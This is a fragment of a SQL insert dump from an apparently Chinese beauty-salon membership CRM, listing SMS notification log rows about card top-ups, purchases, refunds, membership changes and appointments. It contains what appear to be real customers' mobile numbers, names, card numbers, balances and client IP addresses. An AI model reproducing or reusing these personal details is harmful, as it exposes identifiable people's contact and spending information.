(37, '2015-06-17 18:06:54', '成功', 1, 1, 'liuxing99', '18205134946', '【CRM】尊敬的客户:您的卡号:18205134946于2015-06-17 18:16:19次卡消费成功,次卡余额6,卡余额:1464.00 魅力无限灌云店 退订回复TD', '49.88.12.6', '/mms/index.php?m=Home&c=Sale&a=jiciok'),
(38, '2015-06-17 18:18:38', '成功', 1, 1, 'liuxing99', '13812349563', '【CRM】尊敬的客户:您的卡号:888888于2015-06-17 18:22:31商品消费192,卡余额:4124.00 魅力无限东海店 退订回复TD', '127.0.0.1', '/mms/index.php?m=Home&c=Sale&a=jiesuanok'),
(39, '2015-06-17 18:31:26', '成功', 1, 1, 'liuxing99', '18961314946', '【CRM】尊敬的客户:您的卡号:18961314946于2015-06-17 18:40:49次卡消费成功,次卡余额16,卡余额:1205.00 魅力无限灌云店 退订回复TD', '49.88.12.6', '/mms/index.php?m=Home&c=Sale&a=jiciok'),
(40, '2015-06-17 18:40:35', '成功', 1, 1, 'liuxing99', '13812349563', '【CRM】尊敬的客户:您的卡号:888888于2015-06-17 18:44:27商品消费240,卡余额:3884.00 魅力无限东海店 退订回复TD', '127.0.0.1', '/mms/index.php?m=Home&c=Sale&a=jiesuanok'),
(41, '2015-06-17 18:43:38', '成功', 1, 1, 'liuxing99', '13812349563', '【CRM】尊敬的客户:您的卡号:888888于2015-06-17 18:47:32商品消费240,卡余额:3644.00 魅力无限东海店 退订回复TD', '127.0.0.1', '/mms/index.php?m=Home&c=Sale&a=jiesuanok'),
(42, '2015-06-24 13:11:23', '成功', 1, 1, 'liuxing99', '13812349563', '【CRM】尊敬的客户:您的卡号:888888于2015-06-24 13:15:17商品消费272,卡余额:3180.00 魅力无限东海店 退订回复TD', '127.0.0.1', '/mms/index.php?m=Home&c=Sale&a=shangpin'),
(43, '2015-06-24 13:39:28', '成功', 1, 1, 'liuxing99', '18951251872', '【CRM】尊敬的客户:您的卡号:666666于2015-06-24 13:43:29快速消费1000,卡余额:100.00 魅力无限东海店 退订回复TD', '127.0.0.1', '/mms/index.php?m=Home&c=Sale&a=kshyok'),
(44, '2015-06-24 13:40:20', '成功', 1, 1, 'liuxing99', '18951251872', '【CRM】尊敬的客户:您的卡号:666666于2015-06-24 13:44:20充值2200,卡余额:2300.00 魅力无限东海店 退订回复TD', '127.0.0.1', '/mms/index.php?m=Home&c=Ka&a=chongzhi'),
(45, '2015-06-24 13:43:08', '成功', 1, 1, 'liuxing99', '13812349563', '【CRM】尊敬的客户:您的卡号:888888于2015-06-24 13:47:08商品消费240,卡余额:2940.00 魅力无限东海店 退订回复TD', '127.0.0.1', '/mms/index.php?m=Home&c=Sale&a=shangpin'),
(46, '2015-06-24 20:22:01', '成功', 1, 1, 'liuxing99', '18961314946', '【CRM】尊敬的客户:您的卡号:18961314946于2015-06-24 20:31:33充次卡,次卡余额17,卡余额:1205.00 魅力无限灌云店 退订回复TD', '49.88.13.156', '/mms/index.php?m=Home&c=Ka&a=chongciok'),
(47, '2015-06-24 20:25:28', '成功', 1, 1, 'liuxing99', '18961314946', '【CRM】尊敬的客户:您的卡号:18961314946于2015-06-24 20:35:04商品消费95,卡余额:1110.00 魅力无限灌云店 退订回复TD', '49.88.13.156', '/mms/index.php?m=Home&c=Sale&a=shangpin'),
(48, '2015-07-01 10:17:22', '成功', 1, 1, 'liuxing99', '13812349563', '【CRM】亲:您的卡号:888888于2015-07-01 10:21:20商品消费192,卡余额:2748.00 魅力无限东海店 退订回复TD', '127.0.0.1', '/mms/index.php?m=Home&c=Sale&a=shangpin'),
(49, '2015-07-01 11:14:16', '成功', 1, 1, 'liuxing99', '13812349563', '【CRM】亲:您的卡号:888888于2015-07-01 11:18:17商品消费80,卡余额:2668.00 魅力无限东海店 退订回复TD', '127.0.0.1', '/mms/index.php?m=Home&c=Sale&a=shangpin'),
(50, '2015-07-01 14:06:29', '成功', 1, 1, 'liuxing99', '18951251872', '【CRM】亲:会员:陈高明预约了您，顾客将在2015-07-02 09:00:00到店，请做好准备！ 总部 退订回复TD', '127.0.0.1', '/mms/index.php?m=Member&c=Index&a=yuyue_add'),
(51, '2015-07-01 14:13:45', '成功', 1, 1, 'liuxing99', '18951251872', '【CRM】亲:会员陈高明预约了您，顾客将在2015-07-03 16:00:00到店，请做好准备！ 全部店铺 退订回复TD', '192.168.0.2', '/mms/index.php?m=Member&c=Index&a=yuyue_add'),
(52, '2015-07-01 14:21:06', '成功', 1, 1, 'liuxing99', '13812349563', '【CRM】亲:会员陈高明预约了您，顾客将在2010-07-03 10:00:00到店，请做好准备！ 全部店铺 退订回复TD', '192.168.0.2', '/mms/index.php?m=Member&c=Index&a=yuyue_add'),
(53, '2015-07-01 14:22:21', '成功', 1, 1, 'liuxing99', '13812349563', '【CRM】亲:您的卡号:888888于2015-07-01 14:26:22充值1020,卡余额:3688.00 总部 退订回复TD', '127.0.0.1', '/mms/index.php?m=Home&c=Ka&a=chongzhi'),
(54, '2015-07-01 14:36:17', '成功', 1, 1, 'liuxing99', '18951250018', '【CRM】亲:会员陈高明预约了您，顾客将在2015-07-03 10:00:00到店，请做好准备！ 总部 退订回复TD', '127.0.0.1', '/mms/index.php?m=Member&c=Index&a=yuyue_add'),
(55, '2015-07-02 08:28:27', '成功', 1, 1, 'liuxing99', '13812349563', '【CRM】亲:您的卡号:888888于2015-07-02 08:32:22充值550,卡余额:4238.00 魅力无限东海店 退订回复TD', '127.0.0.1', '/mms/index.php?m=Home&c=Ka&a=chongzhi'),
(56, '2015-07-02 08:29:27', '成功', 1, 1, 'liuxing99', '13812349563', '【CRM】亲:您的卡号:888888于2015-07-02 08:33:26商品消费112,卡余额:4126.00 魅力无限东海店 退订回复TD', '127.0.0.1', '/mms/index.php?m=Home&c=Sale&a=shangpin'),
(57, '2015-07-02 08:44:30', '成功', 1, 1, 'liuxing99', '13812349563', '【CRM】亲:您的卡号:888888于2015-07-02 08:48:22退款1020,卡余额:3106.00 总部 退订回复TD', '127.0.0.1', '/mms/index.php?m=Home&c=Ka&a=tuikuanok'),
(58, '2015-07-02 20:32:03', '成功', 1, 1, 'liuxing99', '18961314946', '【CRM】亲:恭喜您于2015-07-02 20:41:51成为本店会员,级别:银卡会员,卡号:18961314946,卡余额:5000.00 美丽人身美容院海州店 退订回复TD', '49.88.18.238', '/mms/index.php?m=Home&c=Huiyuan&a=add'),
(59, '2015-07-02 21:08:30', '成功', 1, 1, 'liuxing99', '18961314946', '【CRM】亲:您的卡号:18951251872于2015-07-02 21:18:18由银卡会员调整为普通会员 美丽人身美容院海州店 退订回复TD', '49.88.18.238', '/mms/index.php?m=Home&c=Huiyuan&a=add'),
(60, '2015-07-02 21:08:33', '成功', 1, 1, 'liuxing99', '18951251872', '【CRM】亲:恭喜您于2015-07-02 21:18:19成为本店会员,级别:普通会员,卡号:18951251872,卡余额:10000.00 美丽人身美容院海州店 退订回复TD', '49.88.18.238', '/mms/index.php?m=Home&c=Huiyuan&a=add'),
(61, '2015-07-02 21:13:55', '成功', 1, 1, 'liuxing99', '18961314946', '【CRM】亲:您的卡号:18961314946于2015-07-02 21:23:39商品消费959.5,卡余额:4040.50 美丽人身美容院海州店 退订回复TD', '49.88.18.238', '/mms/index.php?m=Home&c=Sale&a=shangpin'),
(62, '2015-07-03 09:58:56', '成功', 1, 1, 'liuxing99', '18961314946', '【CRM】亲:您的卡号:于2015-07-03 10:08:42消费撤单-959.50,卡余额:5000.00 美丽人身美容院海州店 退订回复TD', '180.127.66.229', '/mms/index.php?m=Home&c=Xiaofei&a=chedan'),
(63, '2015-07-03 10:03:28', '成功', 1, 1, 'liuxing99', '18961314946', '【CRM】亲:您的卡号:18961314946于2015-07-03 10:13:16由普通会员调整为银卡会员 美丽人身美容院海州店 退订回复TD', '180.127.66.229', '/mms/index.php?m=Home&c=Ka&a=chongciok'),
(64, '2015-07-03 10:03:28', '成功', 1, 1, 'liuxing99', '18961314946', '【CRM】亲:您的卡号:18961314946于2015-07-03 10:13:17充次卡,次卡余额5,卡余额:3290.00 美丽人身美容院海州店 退订回复TD', '180.127.66.229', '/mms/index.php?m=Home&c=Ka&a=chongciok'),
(65, '2015-07-03 10:11:51', '成功', 1, 1, 'liuxing99', '18961314946', '【CRM】亲:您的卡号:18961314946于2015-07-03 10:21:40快速消费290,卡余额:3000.00 美丽人身美容院海州店 退订回复TD', '180.127.66.229', '/mms/index.php?m=Home&c=Sale&a=kshyok'),
(66, '2015-07-03 15:07:54', '成功', 1, 1, 'liuxing99', '18951251872', '【CRM】亲:您的卡号:18951251872于2015-07-03 15:17:39由铂金卡会员调整为普通会员 美丽人身美容院海州店 退订回复TD', '117.92.166.174', '/mms/index.php?m=Home&c=Sale&a=jiesuanok'),
(67, '2015-07-03 15:07:55', '成功', 1, 1, 'liuxing99', '18951251872', '【CRM】亲:您的卡号:18951251872于2015-07-03 15:17:44商品消费757.5,卡余额:9242.50 美丽人身美容院海州店 退订回复TD', '117.92.166.174', '/mms/index.php?m=Home&c=Sale&a=jiesuanok'),
(68, '2015-07-03 15:12:03', '成功', 1, 1, 'liuxing99', '18951251872', '【CRM】亲:您的卡号:18951251872于2015-07-03 15:21:52由普通会员调整为银卡会员 美丽人身美容院海州店 退订回复TD', '117.92.166.174', '/mms/index.php?m=Home&c=Sale&a=jiesuanok'),
(69, '2015-07-03 15:12:04', '成功', 1, 1, 'liuxing99', '18951251872', '【CRM】亲:您的卡号:18951251872于2015-07-03 15:21:53商品消费427.5,卡余额:8815.00 美丽人身美容院海州店 退订回复TD', '117.92.166.174', '/mms/index.php?m=Home&c=Sale&a=jiesuanok'),
(70, '2015-07-03 15:21:50', '成功', 1, 1, 'liuxing99', '18961314946', '【CRM】亲:您的卡号:18961314946于2015-07-03 15:31:34商品消费664,卡余额:2336.00 美丽人身美容院海州店 退订回复TD', '117.92.166.174', '/mms/index.php?m=Home&c=Sale&a=shangpin'),
(71, '2015-07-03 15:36:25', '成功', 1, 1, 'liuxing99', '18951251872', '【CRM】亲:您的卡号:18951251872于2015-07-03 15:46:13商品消费360,卡余额:8455.00 美丽人身美容院海州店 退订回复TD', '117.92.166.174', '/mms/index.php?m=Home&c=Sale&a=jiesuanok'),
(72, '2015-07-03 15:38:03', '成功', 1, 1, 'liuxing99', '18951251872', '【CRM】亲:您的卡号:18951251872于2015-07-03 15:47:52商品消费288,卡余额:8167.00 美丽人身美容院海州店 退订回复TD', '117.92.166.174', '/mms/index.php?m=Home&c=Sale&a=shangpin'),
(73, '2015-07-03 15:40:31', '成功', 1, 1, 'liuxing99', '18961314946', '【CRM】亲:您的卡号:18961314946于2015-07-03 15:50:20次卡消费成功,次卡余额4,卡余额:2336.00 美丽人身美容院海州店 退订回复TD', '117.92.166.174', '/mms/index.php?m=Home&c=Sale&a=jiciok'),
(74, '2015-07-03 20:04:08', '成功', 1, 1, 'liuxing99', '18951251872', '【CRM】亲:您的卡号:18951251872于2015-07-03 20:07:55商品消费360,卡余额:7807.00 美丽人身美容院海州店 退订回复TD', '127.0.0.1', '/mms/index.php?m=Home&c=Sale&a=jiesuanok'),
(75, '2015-07-03 20:12:56', '成功', 1, 1, 'liuxing99', '18951251872', '【CRM】亲:您的卡号:于2015-07-03 20:16:43消费撤单-757.50,卡余额:8564.50 美丽人身美容院海州店 退订回复TD', '127.0.0.1', '/mms/index.php?m=Home&c=Xiaofei&a=chedan'),
(76, '2015-07-03 20:20:51', '成功', 1, 1, 'liuxing99', '18961314946', '【CRM】亲:您的卡号:18961314946于2015-07-03 20:24:43快速消费3000,卡余额:0.00 美丽人身美容院海州店 退订回复TD', '127.0.0.1', '/mms/index.php?m=Home&c=Sale&a=kshyok'),
(77, '2015-07-03 20:22:02', '成功', 1, 1, 'liuxing99', '18961314946', '【CRM】亲:您的卡号:于2015-07-03 20:25:58消费撤单-3000.00,卡余额:2336.00 美丽人身美容院海州店 退订回复TD', '127.0.0.1', '/mms/index.php?m=Home&c=Xiaofei&a=chedan'),
(78, '2015-07-03 20:29:14', '成功', 1, 1, 'liuxing99', '18961314946', '【CRM】亲:您的卡号:18961314946于2015-07-03 20:33:06快速消费4000,卡余额:0.00 美丽人身美容院海州店 退订回复TD', '127.0.0.1', '/mms/index.php?m=Home&c=Sale&a=kshyok'),
(79, '2015-07-03 20:29:32', '成功', 1, 1, 'liuxing99', '18961314946', '【CRM】亲:您的卡号:于2015-07-03 20:33:28消费撤单-4000.00,卡余额:2336.00 美丽人身美容院海州店 退订回复TD', '127.0.0.1', '/mms/index.php?m=Home&c=Xiaofei&a=chedan'),
(80, '2015-07-03 21:34:25', '成功', 1, 1, 'liuxing99', '18951251872', '【CRM】亲:您的卡号:18951251872于2015-07-03 21:38:20充次卡,次卡余额10,卡余额:5684.50 美丽人身美容院海州店 退订回复TD', '127.0.0.1', '/mms/index.php?m=Home&c=Ka&a=chongciok'),
(81, '2015-07-03 21:35:55', '成功', 1, 1, 'liuxing99', '18951251872', '【CRM】亲:您的卡号:18951251872于2015-07-03 21:39:51次卡消费成功,次卡余额8,卡余额:5684.50 美丽人身美容院海州店 退订回复TD', '127.0.0.1', '/mms/index.php?m=Home&c=Sale&a=jiciok'),
(82, '2015-07-06 09:13:38', '成功', 1, 1, 'liuxing99', '15651110214', '【CRM】亲:您的卡号:15651110214于2015-07-06 09:23:32商品消费1140,卡余额:870.00 美丽人身美容院东海店 退订回复TD', '114.237.212.6', '/mms/index.php?m=Home&c=Sale&a=jiesuanok'),
(83, '2015-07-06 09:17:15', '成功', 1, 1, 'liuxing99', '15651110214', '【CRM】亲:您的卡号:15651110214于2015-07-06 09:27:08由普通会员调整为银卡会员 美丽人身美容院东海店 退订回复TD', '114.237.212.6', '/mms/index.php?m=Home&c=Ka&a=chongciok'),
(84, '2015-07-06 09:17:15', '成功', 1, 1, 'liuxing99', '15651110214', '【CRM】亲:您的卡号:15651110214于2015-07-06 09:27:09充次卡,次卡余额10,卡余额:0.00 美丽人身美容院东海店 退订回复TD', '114.237.212.6', '/mms/index.php?m=Home&c=Ka&a=chongciok'),
(85, '2015-07-06 09:17:52', '成功', 1, 1, 'liuxing99', '15651110214', '【CRM】亲:您的卡号:15651110214于2015-07-06 09:27:45次卡消费成功,次卡余额9,卡余额:0.00 美丽人身美容院东海店 退订回复TD', '114.237.212.6', '/mms/index.php?m=Home&c=Sale&a=jiciok'),
(86, '2015-07-06 09:26:01', '成功', 1, 1, 'liuxing99', '13812349563', '【CRM】亲:会员徐敏预约了您，顾客将在2015-07-09 09:30:00到店，请做好准备！ 美丽人身美容院东海店 退订回复TD', '101.226.125.116', '/mms/index.php?m=Member&c=Index&a=yuyue_add'),
(87, '2015-07-06 10:54:11', '成功', 1, 1, 'liuxing99', '13812349563', '【CRM】亲:会员周文慧预约了您，顾客将在2015-07-07 11:30:00到店，请做好准备！ 美丽人身美容院海州店 退订回复TD', '101.226.125.14', '/mms/index.php?m=Member&c=Index&a=yuyue_add'),
(88, '2015-07-06 13:29:13', '成功', 1, 1, 'liuxing99', '15651110214', '【CRM】亲:您的卡号:15651110214于2015-07-06 13:39:04充值5100,卡余额:5100.00 美丽人身美容院东海店 退订回复TD', '114.237.212.6', '/mms/index.php?m=Home&c=Ka&a=chongzhi'),
(89, '2015-07-06 13:32:10', '成功', 1, 1, 'liuxing99', '15651110214', '【CRM】亲:您的卡号:15651110214于2015-07-06 13:42:04充次卡,次卡余额14,卡余额:4300.00 美丽人身美容院东海店 退订回复TD', '114.237.212.6', '/mms/index.php?m=Home&c=Ka&a=chongciok'),
(90, '2015-07-06 13:40:45', '成功', 1, 1, 'liuxing99', '18261332079', '【CRM】亲:恭喜您于2015-07-06 13:50:36成为本店会员,级别:普通会员,卡号:18261332079,卡余额:5000.00 美丽人身美容院东海店 退订回复TD', '117.92.43.67', '/mms/index.php?m=Home&c=Huiyuan&a=add'),
(91, '2015-07-06 13:48:51', '成功', 1, 1, 'liuxing99', '18661255143', '【CRM】亲:恭喜您于2015-07-06 13:58:45成为本店会员,级别:普通会员,卡号:18661255143,卡余额:0.00 美丽人身美容院东海店 退订回复TD', '117.92.43.67', '/mms/index.php?m=Home&c=Huiyuan&a=add'),
(92, '2015-07-06 14:00:27', '成功', 1, 1, 'liuxing99', '18661255143', '【CRM】亲:您的卡号:18661255143于2015-07-06 14:10:20充值5000,卡余额:5000.00 美丽人身美容院东海店 退订回复TD', '117.92.43.67', '/mms/index.php?m=Home&c=Ka&a=chongzhi'),
(93, '2015-07-06 14:02:14', '成功', 1, 1, 'liuxing99', '18261332079', '【CRM】亲:您的卡号:18261332079于2015-07-06 14:12:08商品消费475,卡余额:4525.00 美丽人身美容院东海店 退订回复TD', '117.92.43.67', '/mms/index.php?m=Home&c=Sale&a=shangpin'),
(94, '2015-07-06 14:10:51', '成功', 1, 1, 'liuxing99', '18261332079', '【CRM】亲:您的卡号:18261332079于2015-07-06 14:20:45商品消费190,卡余额:4335.00 美丽人身美容院东海店 退订回复TD', '117.92.43.67', '/mms/index.php?m=Home&c=Sale&a=shangpin'),
(95, '2015-07-06 14:41:10', '成功', 1, 1, 'liuxing99', '18661255143', '【CRM】亲:您的卡号:18661255143于2015-07-06 14:50:59商品消费0,卡余额:5000.00 美丽人身美容院东海店 退订回复TD', '117.92.43.67', '/mms/index.php?m=Home&c=Sale&a=shangpin'),
(96, '2015-07-06 14:43:26', '成功', 1, 1, 'liuxing99', '18661255143', '【CRM】亲:您的卡号:18661255143于2015-07-06 14:53:20商品消费0,卡余额:5000.00 美丽人身美容院东海店 退订回复TD', '117.92.43.67', '/mms/index.php?m=Home&c=Sale&a=shangpin'),
(97, '2015-07-06 14:43:33', '成功', 1, 1, 'liuxing99', '18261332079', '【CRM】亲:您的卡号:18261332079于2015-07-06 14:53:26商品消费0,卡余额:4335.00 美丽人身美容院东海店 退订回复TD', '117.92.43.67', '/mms/index.php?m=Home&c=Sale&a=shangpin'),
(98, '2015-07-06 14:49:33', '成功', 1, 1, 'liuxing99', '18661255143', '【CRM】亲:您的卡号:18661255143于2015-07-06 14:59:26充次卡,次卡余额0,卡余额:5000.00 美丽人身美容院东海店 退订回复TD', '117.92.43.67', '/mms/index.php?m=Home&c=Ka&a=chongciok'),
(99, '2015-07-06 14:52:23', '成功', 1, 1, 'liuxing99', '18261332079', '【CRM】亲:您的卡号:18261332079于2015-07-06 15:02:16充次卡,次卡余额1,卡余额:4145.00 美丽人身美容院东海店 退订回复TD', '117.92.43.67', '/mms/index.php?m=Home&c=Ka&a=chongciok'),
(100, '2015-07-06 14:53:23', '成功', 1, 1, 'liuxing99', '18661255143', '【CRM】亲:您的卡号:18661255143于2015-07-06 15:03:17由银卡会员调整为普通会员 美丽人身美容院东海店 退订回复TD', '117.92.43.67', '/mms/index.php?m=Home&c=Sale&a=shangpin'),
(101, '2015-07-06 14:53:24', '成功', 1, 1, 'liuxing99', '18661255143', '【CRM】亲:您的卡号:18661255143于2015-07-06 15:03:18商品消费800,卡余额:4600.00 美丽人身美容院东海店 退订回复TD', '117.92.43.67', '/mms/index.php?m=Home&c=Sale&a=shangpin'),
(102, '2015-07-06 14:53:27', '成功', 1, 1, 'liuxing99', '18261332079', '【CRM】亲:您的卡号:18261332079于2015-07-06 15:03:20充值2010,卡余额:6155.00 美丽人身美容院东海店 退订回复TD', '117.92.43.67', '/mms/index.php?m=Home&c=Ka&a=chongzhi'),
(103, '2015-07-06 14:58:07', '成功', 1, 1, 'liuxing99', '18661255143', '【CRM】亲:您的卡号:18661255143于2015-07-06 15:08:01次卡消费成功,次卡余额0,卡余额:4600.00 美丽人身美容院东海店 退订回复TD', '117.92.43.67', '/mms/index.php?m=Home&c=Sale&a=jiciok'),
(104, '2015-07-06 14:59:28', '成功', 1, 1, 'liuxing99', '13812349563', '【CRM】亲:会员王静预约了您，顾客将在 08:00:00到店，请做好准备！ 美丽人身美容院东海店 退订回复TD', '221.131.128.200', '/mms/index.php?m=Member&c=Index&a=yuyue_add'),
(105, '2015-07-06 15:17:31', '成功', 1, 1, 'liuxing99', '15651110214', '【CRM】亲:您的卡号:15651110214于2015-07-06 15:27:21次卡消费成功,次卡余额13,卡余额:4300.00 美丽人身美容院东海店 退订回复TD', '114.237.212.6', '/mms/index.php?m=Home&c=Sale&a=jiciok'),
(106, '2015-07-07 10:14:45', '成功', 1, 1, 'liuxing99', '18261332079', '【CRM】亲:您的卡号:18261332079于2015-07-07 10:24:40商品消费475,卡余额:5680.00 美丽人身美容院东海店 退订回复TD', '117.92.178.130', '/mms/index.php?m=Home&c=Sale&a=shangpin'),
(107, '2015-07-07 11:00:14', '成功', 1, 1, 'liuxing99', '18261332079', '【CRM】亲:您的卡号:18261332079于2015-07-07 11:10:09充值10100,卡余额:15780.00 美丽人身美容院东海店 退订回复TD', '117.92.178.130', '/mms/index.php?m=Home&c=Ka&a=chongzhi'),
(108, '2015-07-07 11:00:52', '成功', 1, 1, 'liuxing99', '15206209942', '【CRM】亲:恭喜您于2015-07-07 11:10:48成为本店会员,级别:普通会员,卡号:62284804025566,卡余额:2000.00 美丽人身美容院 退订回复TD', '106.111.121.123', '/mms/index.php?m=Home&c=Huiyuan&a=add'),
(109, '2015-07-07 11:01:11', '成功', 1, 1, 'liuxing99', '18261332079', '【CRM】亲:您的卡号:18261332079于2015-07-07 11:11:05由普通会员调整为银卡会员 美丽人身美容院东海店 退订回复TD', '117.92.178.130', '/mms/index.php?m=Home&c=Sale&a=shangpin'),
(110, '2015-07-07 11:01:12', '成功', 1, 1, 'liuxing99', '18261332079', '【CRM】亲:您的卡号:18261332079于2015-07-07 11:11:08商品消费1615,卡余额:14165.00 美丽人身美容院东海店 退订回复TD', '117.92.178.130', '/mms/index.php?m=Home&c=Sale&a=shangpin'),
(111, '2015-07-07 11:03:46', '成功', 1, 1, 'liuxing99', '18261332079', '【CRM】亲:您的卡号:18261332079于2015-07-07 11:13:42充值11000,卡余额:25165.00 美丽人身美容院东海店 退订回复TD', '117.92.178.130', '/mms/index.php?m=Home&c=Ka&a=chongzhi'),
(112, '2015-07-07 11:04:50', '成功', 1, 1, 'liuxing99', '18261332079', '【CRM】亲:您的卡号:18261332079于2015-07-07 11:14:46商品消费1360,卡余额:23805.00 美丽人身美容院东海店 退订回复TD', '117.92.178.130', '/mms/index.php?m=Home&c=Sale&a=shangpin'),
(113, '2015-07-07 11:08:08', '成功', 1, 1, 'liuxing99', '15206209942', '【CRM】亲:您的卡号:62284804025566于2015-07-07 11:18:04商品消费475,卡余额:1525.00 美丽人身美容院东海店 退订回复TD', '106.111.121.123', '/mms/index.php?m=Home&c=Sale&a=shangpin'),
(114, '2015-07-07 17:36:27', '成功', 1, 1, 'liuxing99', '15651110214', '【CRM】亲:您的卡号:15651110214于2015-07-07 17:46:21商品消费648,卡余额:3652.00 美丽人身美容院海州店 退订回复TD', '171.8.142.101', '/mms/index.php?m=Home&c=Sale&a=jiesuanok'),
(115, '2015-07-07 17:40:05', '成功', 1, 1, 'liuxing99', '15651110214', '【CRM】亲:您的卡号:于2015-07-07 17:50:02消费撤单-648.00,卡余额:4300.00 美丽人身美容院海州店 退订回复TD', '171.8.142.101', '/mms/index.php?m=Home&c=Xiaofei&a=chedan'),
(116, '2015-07-08 09:13:20', '成功', 1, 1, 'liuxing99', '13800138000', '【CRM】亲:恭喜您于2015-07-08 09:23:18成为本店会员,级别:普通会员,卡号:13800138000,卡余额:0.00 美丽人身美容院海州店 退订回复TD', '106.46.226.29', '/mms/index.php?m=Home&c=Huiyuan&a=add'),
(117, '2015-07-08 09:14:59', '成功', 1, 1, 'liuxing99', '13812349563', '【CRM】亲:会员陈丽预约了您，顾客将在 08:00:00到店，请做好准备！ 美丽人身美容院海州店 退订回复TD', '101.226.125.117', '/mms/index.php?m=Member&c=Index&a=yuyue_add'),
(118, '2015-07-08 09:23:14', '成功', 1, 1, 'liuxing99', '13800138000', '【CRM】亲:您的卡号:13800138000于2015-07-08 09:33:11充次卡,次卡余额5,卡余额:0.00 美丽人身美容院海州店 退订回复TD', '106.46.226.29', '/mms/index.php?m=Home&c=Ka&a=chongciok'),
(119, '2015-07-08 09:46:09', '成功', 1, 1, 'liuxing99', '13812349563', '【CRM】亲:会员陈明明预约了您，顾客将在2015-07-09 10:00:00到店，请做好准备！ 全部店铺 退订回复TD', '101.226.69.109', '/mms/index.php?m=Member&c=Index&a=yuyue_add'),
(120, '2015-07-08 14:09:16', '成功', 1, 1, 'liuxing99', '18261332079', '【CRM】亲:您的卡号:18261332079于2015-07-08 14:19:14商品消费400,卡余额:23405.00 美丽人身美容院东海店 退订回复TD', '117.92.167.213', '/mms/index.php?m=Home&c=Sale&a=shangpin'),
(121, '2015-07-10 13:49:35', '成功', 1, 1, 'liuxing99', '13812349563', '【CRM】亲:会员徐敏预约了您，顾客将在 08:00:00到店，请做好准备！ 美丽人身美容院东海店 退订回复TD', '101.226.125.116', '/mms/index.php?m=Member&c=Index&a=yuyue_add'),
(122, '2015-07-10 13:54:30', '成功', 1, 1, 'liuxing99', '18705238063', '【CRM】亲:会员徐敏预约了您，顾客将在2015-07-13 08:00:00到店，请做好准备！ 美丽人身美容院东海店 退订回复TD', '101.226.125.116', '/mms/index.php?m=Member&c=Index&a=yuyue_add'),
(123, '2015-07-10 13:54:54', '成功', 1, 1, 'liuxing99', '18705238063', '【CRM】亲:会员周文慧预约了您，顾客将在2015-07-11 10:00:00到店，请做好准备！ 美丽人身美容院海州店 退订回复TD', '180.105.230.232', '/mms/index.php?m=Member&c=Index&a=yuyue_add'),
(124, '2015-07-10 14:57:51', '成功', 1, 1, 'liuxing99', '13317920984', '【CRM】亲:恭喜您于2015-07-10 15:07:47成为本店会员,级别:普通会员,卡号:666666,卡余额:1000.00 美丽人身美容院东海店 退订回复TD', '114.237.202.182', '/mms/index.php?m=Home&c=Huiyuan&a=add'),
(125, '2015-07-10 14:58:31', '成功', 1, 1, 'liuxing99', '13317920984', '【CRM】亲:您的卡号:666666于2015-07-10 15:08:31充值1050,卡余额:2050.00 美丽人身美容院东海店 退订回复TD', '114.237.202.182', '/mms/index.php?m=Home&c=Ka&a=chongzhi'),
(126, '2015-07-10 15:00:36', '成功', 1, 1, 'liuxing99', '13317920984', '【CRM】亲:您的卡号:666666于2015-07-10 15:10:36商品消费950,卡余额:1100.00 美丽人身美容院东海店 退订回复TD', '114.237.202.182', '/mms/index.php?m=Home&c=Sale&a=shangpin'),
(127, '2015-07-10 16:13:20', '成功', 1, 1, 'liuxing99', '13707207529', '【CRM】亲:恭喜您于2015-07-10 16:23:20成为本店会员,级别:普通会员,卡号:1377777,卡余额:500.00 美丽人身美容院东海店 退订回复TD', '180.105.230.232', '/mms/index.php?m=Home&c=Huiyuan&a=add'),
(128, '2015-07-10 16:14:12', '成功', 1, 1, 'liuxing99', '13707207529', '【CRM】亲:您的卡号:1377777于2015-07-10 16:24:12充值1000,卡余额:1500.00 美丽人身美容院东海店 退订回复TD', '180.105.230.232', '/mms/index.php?m=Home&c=Ka&a=chongzhi'),
(129, '2015-07-10 16:15:20', '成功', 1, 1, 'liuxing99', '13707207529', '【CRM】亲:您的卡号:1377777于2015-07-10 16:25:20商品消费475,卡余额:1025.00 美丽人身美容院东海店 退订回复TD', '180.105.230.232', '/mms/index.php?m=Home&c=Sale&a=shangpin'),
(130, '2015-07-10 16:19:54', '成功', 1, 1, 'liuxing99', '17717173134', '【CRM】亲:恭喜您于2015-07-10 16:29:55成为本店会员,级别:普通会员,卡号:8888,卡余额:0.00 美丽人身美容院东海店 退订回复TD', '114.237.202.182', '/mms/index.php?m=Home&c=Huiyuan&a=add'),
(131, '2015-07-10 16:20:34', '成功', 1, 1, 'liuxing99', '17717173134', '【CRM】亲:您的卡号:8888于2015-07-10 16:30:34充值2100,卡余额:2100.00 美丽人身美容院东海店 退订回复TD', '114.237.202.182', '/mms/index.php?m=Home&c=Ka&a=chongzhi'),
(132, '2015-07-10 16:21:00', '成功', 1, 1, 'liuxing99', '17717173134', '【CRM】亲:您的卡号:8888于2015-07-10 16:31:00商品消费475,卡余额:1625.00 美丽人身美容院东海店 退订回复TD', '114.237.202.182', '/mms/index.php?m=Home&c=Sale&a=shangpin'),
(133, '2015-07-10 18:13:20', '成功', 1, 1, 'liuxing99', '15651110214', '【CRM】亲:您的卡号:15651110214于2015-07-10 18:23:20充值10,卡余额:4310.00 美丽人身美容院东海店 退订回复TD', '180.105.230.232', '/mms/index.php?m=Home&c=Ka&a=chongzhi'),
(134, '2015-07-11 19:38:34', '成功', 1, 1, 'liuxing99', '13812349563', '【CRM】亲:会员亿兰婷预约了您，顾客将在 08:00:00到店，请做好准备！ 美丽人身美容院东海店 退订回复TD', '182.107.33.252', '/mms/index.php?m=Member&c=Index&a=yuyue_add'),
(135, '2015-07-11 19:38:35', '成功', 1, 1, 'liuxing99', '13812349563', '【CRM】亲:会员亿兰婷预约了您，顾客将在 08:00:00到店，请做好准备！ 美丽人身美容院东海店 退订回复TD', '182.107.33.252', '/mms/index.php?m=Member&c=Index&a=yuyue_add'),
(136, '2015-07-11 19:38:38', '成功', 1, 1, 'liuxing99', '13812349563', '【CRM】亲:会员亿兰婷预约了您，顾客将在 08:00:00到店，请做好准备！ 美丽人身美容院东海店 退订回复TD', '182.107.33.252', '/mms/index.php?m=Member&c=Index&a=yuyue_add'),
(137, '2015-07-11 19:38:39', '成功', 1, 1, 'liuxing99', '13812349563', '【CRM】亲:会员亿兰婷预约了您，顾客将在 08:00:00到店，请做好准备！ 美丽人身美容院东海店 退订回复TD', '182.107.33.252', '/mms/index.php?m=Member&c=Index&a=yuyue_add'),
